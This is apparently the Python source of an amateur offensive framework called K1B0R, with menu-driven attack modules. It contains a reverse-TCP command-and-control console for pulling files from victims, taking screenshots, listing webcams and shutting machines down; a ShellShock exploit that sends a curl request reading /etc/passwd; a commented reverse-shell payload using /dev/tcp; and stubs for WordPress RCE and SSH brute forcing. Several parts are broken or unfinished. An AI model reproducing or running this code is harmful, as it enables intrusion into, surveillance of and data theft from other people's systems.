import socket
import os
import sys
import time
import subprocess
import uuid
from ctypes import windll
import base64,os
import threading
# import pygame
# import pygame.camera
import itertools
import requests as re
from datetime import datetime
# import pyscreenshot
# import wordpress_image_rce as wpe
from colorama import init, Fore, Back, Style

init(autoreset=True)


# MADE BY K1B0R Github https://github.com/K1B0R and https://github.com/OreoByte

done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write(Style.BRIGHT + Fore.CYAN + Fore.WHITE + '\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(4)
done = True

print(Style.BRIGHT + Fore.MAGENTA + '''
                        KKKKKKKKK    KKKKKKK  1111111   BBBBBBBBBBBBBBBBB        000000000     RRRRRRRRRRRRRRRRR   
                        K:::::::K    K:::::K 1::::::1   B::::::::::::::::B     00:::::::::00   R::::::::::::::::R  
                        K:::::::K    K:::::K1:::::::1   B::::::BBBBBB:::::B  00:::::::::::::00 R::::::RRRRRR:::::R 
                        K:::::::K   K::::::K111:::::1   BB:::::B     B:::::B0:::::::000:::::::0RR:::::R     R:::::R
                        KK::::::K  K:::::KKK   1::::1     B::::B     B:::::B0::::::0   0::::::0  R::::R     R:::::R
                        K:::::K K:::::K      1::::1     B::::B     B:::::B0:::::0     0:::::0  R::::R     R:::::R
                        K::::::K:::::K       1::::1     B::::BBBBBB:::::B 0:::::0     0:::::0  R::::RRRRRR:::::R 
                        K:::::::::::K        1::::l     B:::::::::::::BB  0:::::0 000 0:::::0  R:::::::::::::RR  
                        K:::::::::::K        1::::l     B::::BBBBBB:::::B 0:::::0 000 0:::::0  R::::RRRRRR:::::R 
                        K::::::K:::::K       1::::l     B::::B     B:::::B0:::::0     0:::::0  R::::R     R:::::R
                        K:::::K K:::::K      1::::l     B::::B     B:::::B0:::::0     0:::::0  R::::R     R:::::R
                        KK::::::K  K:::::KKK   1::::l     B::::B     B:::::B0::::::0   0::::::0  R::::R     R:::::R
                        K:::::::K   K::::::K111::::::111BB:::::BBBBBB::::::B0:::::::000:::::::0RR:::::R     R:::::R
                        K:::::::K    K:::::K1::::::::::1B:::::::::::::::::B  00:::::::::::::00 R::::::R     R:::::R
                        K:::::::K    K:::::K1::::::::::1B::::::::::::::::B     00:::::::::00   R::::::R     R:::::R
                        KKKKKKKKK    KKKKKKK111111111111BBBBBBBBBBBBBBBBB        000000000     RRRRRRRR     RRRRRRR
                +========================================================================================================+
                |                                           Made By                                                      |
                |                                            K1B0R                                                       |
                |                                                                                                        |
                |                           Modules 5    Exploits 2  PrivEsc Modules 0                                   |
                |                           PWN, LISTEN, CAPTURE, TRASNFER, HACK                                         |
                |                                       H4PPY PW3N1NG!                                                   |
                +========================================================================================================+

''')
print('\n')


from colorama import Fore, Style

def show_modules():
    fileObject = open("/usr/local/K1B0R_FRAMEWORK_BETA/modules.txt", "r")
    for line in fileObject:
        print(Style.BRIGHT + Fore.CYAN + line)


class BruteForce():
    def __init__(self) -> None:
        self.options = {
            "RHOST": "",
            "USERNAME": ""
        }

    def useBruteForce(self):
        print('[!] Still In Development Out Of Order For Now')
        brute_server = input(Style.BRIGHT + Fore.YELLOW + "\033[4mK1B0R(\033[0m" + Style.BRIGHT + Fore.RED + "modules/bruteforce/SSH" + Style.BRIGHT + Fore.YELLOW + ")" + Style.BRIGHT + Fore.RED + ":> ") # get input
        parsed_bruteforce_input = brute_server.split()
        command = parsed_bruteforce_input[0].lower()

        if command == "set": # if set is used
            variable = parsed_bruteforce_input[1].upper() # set the variable chosen (Either LHOST or LPORT) to the "variable" variable
            value = " ".join(parsed_bruteforce_input[2:]) # set the value you specified to the "value" varaible
            if variable in self.options: # validation that the value exits
                print(f"{variable} -> {value}") # outputting the variable and value set to it
                self.options[variable] = value # actually setting the value specified to the variable name specified (LHOST or LPORT)


        elif command == "options": # if the command is "options"
            print("\n".join((f"{option} -> {value}" for option, value in self.options.items()))) # output all possible options that can be set with the "set" command

        elif command.lower() in ("run", "exploit"):  # potentially start the listener (i don't know what you want to do with this)
            self.useWPImageExploit()

        elif command == "back": # option to exit the listener function and return back to the main terminal loop below
            return 0


        return self.useBruteForce()


def BruteForce_SSH(hostname, username, password):
    pass



class wordpress():
    def __init__(self) -> None:
        self.options = {
            "RHOST": "",
            "RPORT": "",
        }

    def useWPImage(self):
        wpimage_exploit = input(Style.BRIGHT + Fore.YELLOW + "\033[4mK1B0R(\033[0m" + Style.BRIGHT + Fore.RED + "exploit/Wordpress/Image_RCE" + Style.BRIGHT + Fore.YELLOW + ")" + Style.BRIGHT + Fore.RED + ":> ") # get input
        parsed_wpimageexploit_input = wpimage_exploit.split()
        command = parsed_wpimageexploit_input[0].lower()

        if command == "set": # if set is used
            variable = parsed_wpimageexploit_input[1].upper() # set the variable chosen (Either LHOST or LPORT) to the "variable" variable
            value = " ".join(parsed_wpimageexploit_input[2:]) # set the value you specified to the "value" varaible
            if variable in self.options: # validation that the value exits
                print(f"{variable} -> {value}") # outputting the variable and value set to it
                self.options[variable] = value # actually setting the value specified to the variable name specified (LHOST or LPORT)


        elif command == "options": # if the command is "options"
            print("\n".join((f"{option} -> {value}" for option, value in self.options.items()))) # output all possible options that can be set with the "set" command

        elif command.lower() in ("run", "exploit"):  # potentially start the listener (i don't know what you want to do with this)
            self.useWPImageExploit()

        elif command == "back": # option to exit the listener function and return back to the main terminal loop below
            return 0


        return self.useWPImage()


    def useWPImageExploit(self):
            TARGET = self.options["RHOST"]
            TARGET_PORT = self.options["RPORT"]
            self.wpe.wordpress_image_exploit(RHOST=TARGET, RPORT=TARGET_PORT)
            print('[+] Start A NetCat Listener')
            print(f'nc -lnvp {TARGET} {TARGET_PORT}')

class banner:
    def ban1():
        file = open("C:/Users/narut/Desktop/K1B0R_FRAMEWORK_BETA/K1B0RFRAMEWORK/Extra/asciiart.txt", 'r')
        print(Style.BRIGHT + Fore.MAGENTA + file.read())



class ShellShock():
    def __init__(self) -> None:
        self.options = {
            "RHOST": "",
            "FILE": "",
            "SSL: true / false": "",
            "TARGETDIR": "",
            "RPORT": "",
            "LHOST": "",
            "LPORT": "",
        }

    def useShellShock(self):
        shellshock_input = input(Style.BRIGHT + Fore.YELLOW + "\033[4mK1B0R(\033[0m" + Style.BRIGHT + Fore.RED + "exploit/CVE-2014-6271/ShellShock" + Style.BRIGHT + Fore.YELLOW + ")" + Style.BRIGHT + Fore.RED + ":> ") # get input
        parsed_shellshock_input = shellshock_input.split()
        command = parsed_shellshock_input[0].lower()

        if command == "set": # if set is used
            variable = parsed_shellshock_input[1].upper() # set the variable chosen (Either LHOST or LPORT) to the "variable" variable
            value = " ".join(parsed_shellshock_input[2:]) # set the value you specified to the "value" varaible
            if variable in self.options: # validation that the value exits
                print(f"{variable} -> {value}") # outputting the variable and value set to it
                self.options[variable] = value # actually setting the value specified to the variable name specified (LHOST or LPORT)


        elif command == "options": # if the command is "options"
            print("\n".join((f"{option} -> {value}" for option, value in self.options.items()))) # output all possible options that can be set with the "set" command

        elif command.lower() in ("run", "exploit"):  # potentially start the listener (i don't know what you want to do with this)
            self.exploitShellShock()

        elif command == "back": # option to exit the listener function and return back to the main terminal loop below
            return 0


        return self.useShellShock()

    def exploitShellShock(self):
        FILE = self.options["FILE"]
        DIR = self.options["TARGETDIR"]
        RHOST = self.options["RHOST"]
        SSL = self.options["SSL: true / false"]
        RPORT = self.options["RPORT"]
        LHOST = self.options["LHOST"]
        LPORT = self.options["LPORT"]

        if SSL == 'true':
            web_protocol = 'https'
        elif SSL == 'false':
            web_protocol = 'http'
        elif SSL == 'True':
            web_protocol = 'https'
        elif SSL == 'False':
            web_protocol = 'http'

        print(Style.BRIGHT + Fore.CYAN + '[*]' + Style.BRIGHT + Fore.WHITE +  f'Start A NetCat Listener To Get Shell!')
        print(f'Enter Command: nc -lnvp {LPORT}')
        os.system("curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' " + web_protocol + "://" + RHOST + "/" + DIR + "/" + FILE)
        #os.system("curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1 " + web_protocol + "://" + RHOST + ":" + RPORT + "/" + DIR + "/" + FILE)

class Listener: # listener class to house everything related to listener
    def __init__(self):
        self.options = { # available options to be set by user
            "LHOST": "",
            "LPORT": ""
        }

    def useListener(self): # listener terminal 
        listener_input = input(Style.BRIGHT + Fore.YELLOW + "\033[4mK1B0R(\033[0m" + Style.BRIGHT + Fore.RED + "Listener" + Style.BRIGHT + Fore.YELLOW + ")" + Style.BRIGHT + Fore.RED + ":> ") # get input
        parsed_listener_input = listener_input.split() # split the input into seperate items in a list for easier access
        command = parsed_listener_input[0].lower() # setting the first item of parsed input (most likeley "set") to a seperate variable

        # checking the executed command

        if command == "set": # if set is used
            variable = parsed_listener_input[1].upper() # set the variable chosen (Either LHOST or LPORT) to the "variable" variable
            value = " ".join(parsed_listener_input[2:]) # set the value you specified to the "value" varaible
            if variable in self.options: # validation that the value exits
                print(f"{variable} -> {value}") # outputting the variable and value set to it
                self.options[variable] = value # actually setting the value specified to the variable name specified (LHOST or LPORT)

        elif command == "options": # if the command is "options"
            print("\n".join((f"{option} -> {value}" for option, value in self.options.items()))) # output all possible options that can be set with the "set" command

        elif command.lower() in ("run", "exploit"):  # potentially start the listener (i don't know what you want to do with this)
            self.startListening()

        elif command == "back": # option to exit the listener function and return back to the main terminal loop below
            return 0

        # repeating input

        return self.useListener() # recursion allowing the user to keep giving inputs to the LISTENER terminal if they so choose to

    def startListening(self): # start listening function that you can potentially use when starting the listener

        # Starting Socket Server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Binding Server
        LPORT = self.options["LPORT"]
        LHOST = self.options["LHOST"]

        s.bind((LHOST, int(LPORT)))

        # Lestening To 1 Connection
        s.listen(1)

        print(Style.BRIGHT + Fore.CYAN + '[*]' + Style.BRIGHT + Fore.WHITE +  f' Started Reverse TCP Listener On {self.options["LHOST"]}:{self.options["LPORT"]}')
        # Accept Connection
        conn, addr = s.accept()

        print (Style.BRIGHT + Fore.CYAN + '[*]' + Style.BRIGHT + Fore.WHITE + f' Sending Stage To {addr}')

        # We Do Not Know The Target's Working Directory
        # So Initially It Is "Shell"
        cwd = 'Shell'

        # Recieve Response From Target
        r = conn.recv(5120).decode('utf-8')

        # If Response Contains "dir:"
        # It Means It Contains Target's Current Working Directory
        if ('dir:' in r):
        # Extract Working Directory
        # Skip 4 Characters
        # Because They Are 'd', 'i', 'r', ':'
            cwd = r[4:]

        while True:
        # Input Command From User
            command = input(str(cwd) + ":> ")
            msg = ''

            if 'terminate' in command:
            # Send Command To Target
                conn.send('terminate'.encode('utf-8'))

            # Close Connection
                print('Closing Connection')
                conn.close()

            # Break Loop
                break

            elif 'commands' in command:
            # Shows Help List Of Availiable Commands
                conn.send(command.encode('utf-8'))
                message = conn.recv(1024)
                print(message.decode('utf-8')) # webcam_snap and screenshot not done yet

                    # Shows Users Location 
            elif 'data.location' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    message = conn.recv(1024)
                    print(message.decode('utf-8'))
                except:
                    'null'

                # Shows Targets MAC Address
            elif 'data.mac' in command:
                try:
                    conn.send('data.mac'.encode('utf-8'))
                    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
                    print(mac)
                except:
                    'null'

            elif 'spy.webcam_snap' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    message = conn.recv(1024)
                    if not (message):
                            break
                    file.write(message)

                except:
                    'null'

                # Shows Targets Hostname
            elif 'data.hostname' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    message = conn.recv(1024)
                    print(message.decode('utf-8'))
                except:
                    'null'

            elif 'priv.exec' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    s.close()
                    main()
                except:
                    'null'

                # Shows Targets IP
            elif 'data.ip' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    data = conn.recv(1024)
                    print(data.decode('utf-8'))
                except:
                     'null'

                # Shows Targets Operatingsystem
            elif 'data.os' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    message = conn.recv(1024)
                    print(message)
                except:
                    'null'

            elif 'trollsploit.orange' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    print(Style.BRIGHT + Fore.GREEN + '[!] shit man...you really had to do them like that?....WOW')
                except:
                    'null'

                # Shows Targets CPU / Core
            elif 'data.core' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    message = conn.recv(1024).decode('utf-8')
                    print(message.decode('utf-8'))
                except:
                    'null'

            elif 'trollsploit.background' in command:
                conn.send(command.encode('utf-8'))
                # Code For Changing Computers Background
                # start
        
                #TrollSploit
                # Plays Rick Ashley Never Gonna Give You Up No Ads ;3
            elif 'trollsploit.rickroll' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    print('[+] Done')
                except:
                    'null'

            elif 'migrate' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    print('[!] Session Will Die Then Restart')
                except:
                    return 'null'
            
                # Spams Notes On Users Desktop x3
            elif 'trollsploit.note_spam' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe echo PWNED BY THE FINEST X3 > PWNED.txt')
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe mv PWNED.txt ~/Desktop')
                except:
                    'null'

                    # Plays Funny FBI Open Up Loli Dnace x3
            elif 'trollsploit.fbi_openup' in command:
                conn.send(command.encode('utf-8'))
                print('[+] Done')

                # Spy Controls
                # Lists Users Webcams
            elif 'spy.list_webcam' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    subprocess.call('C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe Get-PnpDevice -FriendlyName *camera*', shell=True)
                except:
                    'null'
            
            elif 'spy.screenshot' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    save_screenshot = pyscreenshot.grab()
                    message = conn.recv(1024).decode('ascii')
                    save_screenshot.save(message)                     
                except:
                    'null'

                # Start Of Transfer For The Image
                file_name = conn.recv(1024).decode('utf-8')
                print("[+] Fetching [" + file_name + "]...")

                # Send Response
                conn.send('OK'.encode('utf-8'))
        
                # Recieve Filesize
                file_size = conn.recv(1024).decode('utf-8')
        
                # Send Response
                conn.send('OK'.encode('utf-8'))

                # Print Size Of File In KB
                print("[Info] Total: " + str(int(file_size)/1024) + " KB")

                # Open File For Writing
                with open(file_name, "wb") as file:
            
                # File Will Be Recieved In Small Chunks Of Data
                # Chunks Recieved
                    c = 0
            
                # Starting Time
                    start_time = time.time()

                # Running Loop Until c < int(file_size)
                    while c < int(file_size):

                    # Recieve Bytes
                        data = conn.recv(1024)

                # Break If No Data
                        if not (data):
                            break

                # Write Data To File
                        file.write(data)

                # Chunks Recieved
                        c += len(data)

                # Ending the time capture.
                    end_time = time.time()

                # Show Time
                print("[+] File Grabbed. Total time: ", end_time - start_time)
                # End Of Transfer Of The Image

            # System Control Options

            # Lists Drives On Computer
            elif 'sysctl.list_drives' in command:
                conn.send(command.encode('utf-8'))
                message = conn.recv(1024)
                print(message.decode('utf-8'))

                # Shuts Down System
            elif 'sysctl.shutdown' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    print('[!] Shuting Down')
                except:
                    'null'

            elif 'sysctl.disable_wifi' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    print('[!] Wifi Is Shutting Down')
                except:
                    'null'

                # Restarts System
            elif 'sysctl.restart' in command:
                try:
                    conn.send(command.encode('utf-8'))
                    print('[!] Restarting')
                except:
                    'null'


            elif 'download' in command:
                # Send Command
                conn.send(command.encode('utf-8'))

                # Recieve Filename
                file_name = conn.recv(1024).decode('utf-8')
                print(Style.BRIGHT + Fore.MAGENTA + "[+]" + Style.BRIGHT + Fore.WHITE + "Grabbing [" + file_name + "]...")

                # Send Response
                conn.send('OK'.encode('utf-8'))
                
                # Recieve Filesize
                file_size = conn.recv(1024).decode('utf-8')
                
                # Send Response
                conn.send('OK'.encode('utf-8'))

                # Print Size Of File In KB
                print(Style.BRIGHT + Fore.MAGENTA + "[Info]" +  Style.BRIGHT + Fore.WHITE + "Total: " + str(int(file_size)/1024) + " KB")

                # Open File For Writing
                with open(file_name, "wb") as file:
                    
                    # File Will Be Recieved In Small Chunks Of Data
                    # Chunks Recieved
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Loop Until c < int(file_size)
                    while c < int(file_size):

                        # Recieve Bytes
                        data = conn.recv(1024)

                        # Break If No Data
                        if not (data):
                            break

                        # Write Data To File
                        file.write(data)

                        # Chunks Recieved
                        c += len(data)

                    # Ending the time capture.
                    end_time = time.time()

                # Show Time
                print(Style.BRIGHT + Fore.MAGENTA + "[+]" + Style.BRIGHT + Fore.WHITE + "File Grabbed. Total time: ", end_time - start_time)

            elif 'upload' in command:
                conn.send(command.encode('utf-8'))

                # Getting File Details
                file_name = command[9:]
                file_size = os.path.getsize(file_name)

                # Sending Filename
                conn.send(file_name.encode('utf-8'))

                # Recieve And Print Response
                print(conn.recv(1024).decode('utf-8'))

                # Send File Size
                conn.send(str(file_size).encode('utf-8'))
                
                print("Getting Response")
                print(conn.recv(1024).decode('utf-8'))
                
                print(Style.BRIGHT + Fore.MAGENTA + "[+]" + Style.BRIGHT + Fore.WHITE + "Transferring [" + str(file_size/1024) + "] KB...")

                # Open File For Reading
                with open(file_name, "rb") as file:
                    
                    # Chunks Sent
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()
                    
                    # Running Loop Until c < int(file_size)
                    while c < int(file_size):

                        # Read 1024 Bytes
                        data = file.read(1024)

                        # If No Data? Break The Loop
                        if not (data):
                            break

                        # Send Data To Target
                        conn.sendall(data)

                        # Chunks Added
                        c += len(data)

                    # Ending Time
                    end_time = time.time()
                    
                    print(Style.BRIGHT + Fore.MAGENTA + "[+]" + Style.BRIGHT + Fore.WHITE + "File Transferred. Total time: ", end_time - start_time)

            # Otherwise If Command Is Not Null
            elif (len(command.strip()) > 0):

                # Send Command To Target
                conn.send(command.encode('utf-8'))

                # Read Reply From Target
                r = conn.recv(5120).decode('utf-8')

                # If 'dir:' in Reply? Target Has Sent It's Working Directory
                if ('dir:' in r):

                    # Get Working Directory
                    cwd = r[4:]
                else:

                    # Otherwise Print Reply
                    print (r)

    if __name__ == '__startListening__':        
        startListening()

def main():
    listener = Listener() # creating an object of the above Listener class
    shellshock = ShellShock()
    wp = wordpress()

    while True: # will keep main terminal input active unless user chooses to exit
        framework = input(Style.BRIGHT + Fore.YELLOW + "\033[4mK1B0R\033[0m" + Style.BRIGHT + Fore.RED + ":> ")
        
        if framework.lower() == 'use listener': # if user inputs "use listener"
            listener.useListener() # start the listener terminal
        
        elif framework.lower() == 'use shellshock':
            shellshock.useShellShock()
        
        elif framework.lower() == 'use exploit/Wordpress/Image_RCE':
            wp.useWPImage()

        elif framework.lower() == 'banner':
            banner.ban1()

        elif framework.lower() in ('help', '?', 'Help'):
            print(Style.BRIGHT + Fore.GREEN + '''
            Show Modules            # Quit The Framework
            exit                    # Quit The Framework
            fs                      # Quit The Framework
            quit                    # Quit The Framework
            help                    # Display Help Menu
            banner                  # Displays The Banner
            ''')

        elif framework.lower() in ('show modules'):
            show_modules()


        elif framework.lower() in ("exit", 'fs', 'quit'): # completely exit application if "exit" is input
            print(Style.BRIGHT + Fore.RED + '[!] GoodBye For Now Fren ;3')
            break

if __name__ == "__main__":
    main()